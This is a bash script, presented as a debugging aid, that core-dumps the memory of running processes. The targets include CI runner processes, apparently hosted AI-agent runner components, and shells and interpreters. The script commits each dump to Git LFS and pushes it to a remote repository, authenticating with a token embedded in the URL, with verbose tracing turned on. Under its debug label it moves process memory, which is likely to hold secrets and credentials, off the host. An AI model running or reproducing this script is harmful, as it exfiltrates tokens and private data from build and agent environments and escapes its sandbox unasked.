#!/bin/bash

# Debug script: List PIDs and dump memory for a selected process by name

set -e

# List all running processes with their PIDs and command names
ps -eo pid,comm --sort=pid

# Define process name prefixes to match
PREFIXES=(
    "hosted-compute-" "Runner.Listener" "Runner.Worker"
    "hv_kvp_daemon" "python3" "provjob" "start-mcp-serve"
    "padawan-fw" "sh" "node" "python" "bash"
)

# Find matching PIDs
MATCHED_PIDS=()
for prefix in "${PREFIXES[@]}"; do
    while read -r pid comm; do
        if [[ "$comm" == $prefix* ]]; then
            MATCHED_PIDS+=("$pid:$comm")
        fi
    done < <(ps -eo pid,comm --no-headers)
done

if [ ${#MATCHED_PIDS[@]} -eq 0 ]; then
    echo "No matching processes found for prefixes: ${PREFIXES[*]}"
    exit 1
fi

for entry in "${MATCHED_PIDS[@]}"; do
    pid="${entry%%:*}"
    comm="${entry#*:}"
    echo "Selected PID: $pid for process: $comm"

    # Check if gcore is available
    if ! command -v gcore &> /dev/null; then
        echo "gcore (GNU core dump utility) is not installed. Installing..."
        sudo apt-get update && sudo apt-get install -y gdb
        if ! command -v gcore &> /dev/null; then
            echo "Error: gcore could not be installed."
            exit 2
        fi
    fi
    
    # Check if bc is available for file size calculations
    if ! command -v bc &> /dev/null; then
        echo "bc (basic calculator) is not installed. Installing..."
        sudo apt-get install -y bc
    fi

    # Dump memory to core.$pid file
    sudo gcore -o core "$pid"
    DUMP_FILE="core.$pid"
    
    # Check file size and display
    if [ -f "$DUMP_FILE" ]; then
        FILE_SIZE=$(stat -c%s "$DUMP_FILE")
        FILE_SIZE_MB=$(($FILE_SIZE / 1024 / 1024))
        FILE_SIZE_GB=$(echo "scale=2; $FILE_SIZE_MB / 1024" | bc -l)
        echo "Memory dump created: $DUMP_FILE"
        echo "File size: ${FILE_SIZE_MB}MB (${FILE_SIZE_GB}GB)"
    else
        echo "Error: Memory dump file $DUMP_FILE was not created"
        continue
    fi
    git config --global user.name "thefaftek-git"
    git config --global user.email "thefaftek-git@users.noreply.github.com"
    # Add dump to git lfs tracking if not already tracked
    if ! grep -q '\*.core.*' .gitattributes 2>/dev/null; then
        git lfs track "*.core*"
        git add .gitattributes
        git commit -m "Track core dump files with Git LFS"
        REPO_URL=$(git config --get remote.origin.url)
        REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@${REPO_URL#https://}"
        git push "$REPO_URL_AUTH" HEAD:$(git rev-parse --abbrev-ref HEAD)
    fi

    # Add, commit, and push the dump
    echo "Adding $DUMP_FILE to git..."
    git add "$DUMP_FILE"
    echo "Committing $DUMP_FILE..."
    git commit -m "Add memory dump: $DUMP_FILE"

    # Pull and rebase to avoid non-fast-forward errors
    REPO_URL=$(git config --get remote.origin.url)
    REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@${REPO_URL#https://}"
    
    echo "Starting LFS upload for $DUMP_FILE (${FILE_SIZE_GB}GB)..."
    echo "This may take several minutes for large files..."
    
    # Enable git lfs progress and verbose output
    export GIT_LFS_PROGRESS=1
    export GIT_TRACE=1
    export GIT_CURL_VERBOSE=1
    
    # Push LFS objects with maximum verbosity
    echo "Pushing LFS objects..."
    git lfs push origin --all
    
    echo "Pushing git commits..."
    git push "$REPO_URL_AUTH" HEAD:$(git rev-parse --abbrev-ref HEAD)
    echo "✅ Memory dump $DUMP_FILE committed and pushed successfully."

    # Delete the dump file before dumping the next process
    rm -f "$DUMP_FILE"
done
